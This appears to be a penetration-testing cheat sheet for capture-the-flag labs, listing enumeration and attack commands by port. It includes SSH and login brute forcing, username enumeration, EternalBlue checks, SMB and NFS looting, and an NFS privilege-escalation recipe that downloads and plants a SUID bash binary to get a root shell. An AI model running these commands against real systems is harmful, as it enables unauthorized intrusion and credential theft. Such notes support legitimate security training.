# Enumeration



## **Ports**

### **FTP**

TCP port 21

Login (try using anonymous:anonymous, anonymous:password, guest:guest, etc.).

```
ftp $VICTIM 21
```

List files.

```
ls
```

List files (using Curl).

```
curl ftp://anonymous:anonymous@$VICTIM:21
```

Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).

```
binary
passive
```

Download a file.

```
get file.txt
```

Download all files.

```
mget *
```

Download all files to the current directory (using Wget).

```
wget -m ftp://anonymous:anonymous@$VICTIM:21 -nd
```

Upload a file.

```
put file.txt
```

End a FTP session.

```
exit
```

### **SSH**

TCP port 22

```
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
```

### **SMTP**

TCP port 25.

```
telnet $VICTIM25
HELO
VRFY root
QUIT
```

```
sudo nmap $VICTIM -p25 --script smtp-commands -oN scans/$VICTIM-nmap-scripts-smtp-commands
```

```
sudo nmap $VICTIM -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$VICTIM -nmap-scripts-smtp-enum-users
```

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VICTIM
```

```
sudo nmap $VICTIM -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
```

### **HTTP(s)**

HTTP TCP port 80 / HTTP TCP 443

Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)

```
dirb http://$VICTIM
dirb http://$VICTIM:$PORT/ -o scans/$VICTIM-dirb-$PORT-common
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
```

```
dirsearch -u $VICTIM:$PORT -o $FULLPATH/$NAME-dirsearch-80
```

Nikto Tuning (-T) Options

```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

Scan for misconfigurations.

```
nikto -h $VICTIM -T 2 -Format txt -o scans/$VICTIM-nikto-80-misconfig
```

Scan for SQL injection vulnerabilities.

```
nikto -h $VICTIM -T 9 -Format txt -o scans/$VICTIM-nikto-80-sqli
```

Check if the target is vulnerable to Shellshock

```
sudo nmap $VICTIM -p80 --script http-shellshock -oN scans/$VICTIM-nmap-scripts-80-http-shellshock
```

Check if these files exist to gather info

```
http://$VICTIM/robots.txt
http://$VICTIM/sitemap.xml
```

#### &#x20;Username Enumeration

Example on how to find existing usernames from a website. Command would need to be adjusted to work with the webpage and at least one other user account must be known to know the corrector error message.

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/signup -mr "username already exists" -o users.csv -of csv
```

#### Brute Force

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/login -fc 200
```



### **POP3**

TCP port 110

```
telnet $VICTIM 110
USER root
PASS root
RETR 1
QUIT
```

### **RPC**

TCP port 135

```
rpcclient -U '' $VICTIM
srvinfo
netshareenum # print the real file-path of shares; good for accurate RCE
```

### **NetBIOS**

TCP port 139

```
nbtscan $VICTIM
```

### **SMB**

TCP port 445

```
smbclient -L //$VICTIM/ # list shares
smbclient -L //$VICTIM/ -p $PORT # specify non-standard SMB/Samba port

```

Download files with smbclient

<pre><code><strong>cd loot
</strong>smbclient \\\\$VICTIM\\$SHARE
prompt
mget *
</code></pre>

The SMB shares discovered have the following permissions.

```
smbmap -H $VICTIM
smbmap -H $VICTIM-P $PORT
```

Download files with smbget

```
smbget -R smb://$VICTIM/$SHARE
smbget -R smb://$VICTIM:$PORT/$SHARE
```



```
# check if vulnerable to EternalBlue
sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
```

```
# check if vulnerable to SambaCry
sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
```

### **Rsync**

TCP port 873

```
sudo nmap $VICTIM-p873 --script rsync-list-modules
rsync -av rsync://$VICTIM/$SHARE --list-only
rsync -av rsync://$VICTIM/$SHARE loot
```

### **NFS**

TCP port 2049

<pre><code><strong>sudo nmap $VICTIM-p111 --script-nfs*
</strong>showmount -e $VICTIM
</code></pre>

**Create mount**

```
sudo mkdir /mnt/FOO
mount -t nfs $VICTIM:$SHARE /tmp/mount/ -nolock
sudo mount //$VICTIM:/$SHARE /mnt/FOO
```

**Interesting loot to look for**

<pre><code><strong>- id_rsa from users home directories
</strong></code></pre>

**Privilege Escalation**

Example of how you can get root shell. All commands except the last one are run on our Kali machine where we can control the permissions fully. Then we just run the exploit as the normal user we already have access to.

```
#Download exploit
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

mv bash /mount/point
chown root /mount/point/bash
chmod +u /mount/point/bash
chmod +d /mount/point/bash

#SSH in as victim and run the following
/mount/point/bash -p
```

### **SQL**

TCP port 3306

```
mysql -u $USER -h $VICTIM
```

### **RDP**

TCP port 3389

```
sudo nmap $VICTIM -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
```

```
rdesktop -u administrator $VICTIM
```

### **Postgres**

TCP port 5437

```
psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
SELECT pg_ls_dir('/');
```

### **WinRM**

TCP port 5985

```
evil-winrm -u $USER -p $PASSWORD -i $VICTIM
```

### **IRC**

TCP port 6667

```
irssi -c $VICTIM -p $PORT
```

####

\
